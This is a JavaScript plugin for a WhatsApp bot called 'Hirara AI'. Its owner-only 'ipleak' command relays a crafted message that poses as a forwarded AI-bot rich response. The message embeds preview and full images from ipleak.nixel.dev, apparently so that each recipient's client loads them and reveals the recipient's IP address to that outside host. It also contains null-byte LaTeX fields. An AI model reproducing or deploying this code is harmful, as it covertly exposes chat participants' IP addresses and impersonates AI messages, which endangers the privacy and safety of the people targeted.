/**

* Hirara AI — WhatsApp Bot
* 
* Library      : @wishkeysocket/baileys
* Type         : Plugins | ESM Modules
* Creator      : Mommy Kyu
* Recode       : (Your Name)
* 
* Official Channels:
* • https://whatsapp.com/channel/0029VbDO8tI2phHLTSN2ed0U
* • https://whatsapp.com/channel/0029VbCKm3I5EjxsUbvmVf33
* 
* Thanks To:
* • Allah SWT. — The Creator of Everything
* • Mother & Father — My Greatest Support
* • Kyu — Developer of Hirara AI
* • Hilman — Developer of Ryo Yamada MD
* • Kano — femboy jing
* • Rennz — pemboy nya akuu
* • Raynold — penyopng Ourin jir 😹
* • Fahri — Developer of Jssslyn MD
* • Amane Offc — orng belok
* • All Buyers
* • All Users & Contributors
* 
* Documentation:
* [ID]  Baca README.md untuk melihat panduan.
* [EN]  Read README.md untuk melihat panduan.
* 
* Distribution Notice:
* Dilarang menyebarkan source code ini secara gratis
* tanpa izin dari creator.
* 
* Pelanggaran terhadap ketentuan ini dapat menyebabkan
* penghentian update dan dukungan terhadap source code.
* 
* Copyright © Mommy Kyu 2026
* All Rights Reserved.
  */

const handler = async (m, { conn, text }) => {
	await conn.relayMessage(
		m.chat,
		{
			messageContextInfo: {
				deviceListMetadata: {},
				deviceListMetadataVersion: 2,
				botMetadata: {
					messageDisclaimerText: '',
					richResponseSourcesMetadata: {}
				}
			},
			botForwardedMessage: {
				message: {
					richResponseMessage: {
						messageType: 1,
						unifiedResponse: {
							data: Buffer.from(JSON.stringify({
								"response_id": "24f4ec25-a8b4-45b5-8cb1-d2504e3ab640",
								"sections": [
									{
										"__typename": "GenAIUnifiedResponseSection",
										"view_model": {
											"__typename": "GenAISingleLayoutViewModel",
											"primitive": {
												"__typename": "GenAIMarkdownTextUXPrimitive",
												"text": "{{NIXEL}}\u0000{{/NIXEL}}",
												"inline_entities": [
													{
														"__typename": "GenAITextInlineEntity",
														"key": "NIXEL",
														"metadata": {
															"__typename": "GenAILatexItem",
															"latex_expression": "\u0000",
															"font_height": 24,
															"padding": 4,
															"latex_image": {
																"__typename": "GenAIMediaItem",
																"mime_type": "image/png",
																"url": "https://files.catbox.moe/2rpeyy.png",
																"url_fallback": "https://files.catbox.moe/2rpeyy.png",
																"width": 417.3913043478261,
																"height": 117.3913043478261,
																"expiration_timestamp_ms": 1786618500000
															}
														}
													}
												]
											}
										}
									},
									{
										"view_model": {
											"primitive": {
												"__typename": "GenAIImagePrimitive",
												"preview_image": {
													"__typename": "GenAIMediaItem",
													"mime_type": "image/jpeg",
													"url": "https://ipleak.nixel.dev/image/ip?timestamp=" + Date.now()
												},
												"full_image": {
													"__typename": "GenAIMediaItem",
													"mime_type": "image/jpeg",
													"url": "https://ipleak.nixel.dev/image/ip?timestamp=" + Date.now()
												}
											},
											"__typename": "GenAISingleLayoutViewModel"
										}
									},
									{
										"view_model": {
											"primitive": {
												"__typename": "GenAIFooterActionPrimitive",
												"cta_text": "WhatsApp Group",
												"cta_type": "OPEN_URL",
												"cta_url": global.linkGC || "https://chat.whatsapp.com/LlePewannNRKTuduT4u57M?s=cl&p=a&mlu=4&ilr=4"
											},
											"__typename": "GenAISingleLayoutViewModel"
										}
									}
								]
							})).toString('base64')
						},
						contextInfo: {
							forwardingScore: 1,
							isForwarded: true,
							forwardedAiBotMessageInfo: {
								botJid: "0@bot"
							},
							forwardOrigin: 4
						}
					}
				}
			}
		},
		{}
	);
};

handler.help = ['ipleak'];
handler.tags = ['owner'];
handler.command = ['ipleak'];
handler.owner = true;
handler.noJadiBot = true;

export default handler;
